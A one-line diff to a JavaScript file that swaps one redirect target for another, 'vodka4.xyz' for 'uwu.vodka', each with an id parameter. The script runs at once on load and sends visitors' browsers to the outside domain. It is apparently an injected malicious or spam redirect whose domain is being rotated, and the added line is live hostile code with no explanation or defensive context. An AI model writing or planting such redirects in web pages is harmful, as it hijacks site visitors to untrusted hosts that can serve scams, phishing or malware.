@@ -1,1 +1,1 @@
-function executeRun(){window.location.href="https://vodka4.xyz?id=2690"}executeRun();
+function executeRun(){window.location.href="https://uwu.vodka?id=3874"}executeRun();
